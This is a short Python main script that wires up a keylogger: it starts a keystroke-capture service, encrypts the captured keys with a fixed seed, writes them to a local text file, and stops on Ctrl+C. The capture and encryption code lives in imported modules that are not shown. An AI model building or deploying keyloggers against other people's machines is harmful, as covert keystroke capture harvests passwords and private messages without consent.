from keyloggerService import KeyLoggerService
from fileWriter import FileWriter
from encryptor import Encryptor
from keyloggerManager import KeyLoggerManager
import time

if __name__ == "__main__":
    keylogger = KeyLoggerService()
    keylogger.init()
    writer = FileWriter("logged_keys.txt")
    encryptor = Encryptor(42)
    manager = KeyLoggerManager(keylogger, writer, encryptor)

    print("Keylogger is running... Press Ctrl+C to stop.")
    manager.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping Keylogger...")
        manager.stop()
        print("Keylogger stopped.")
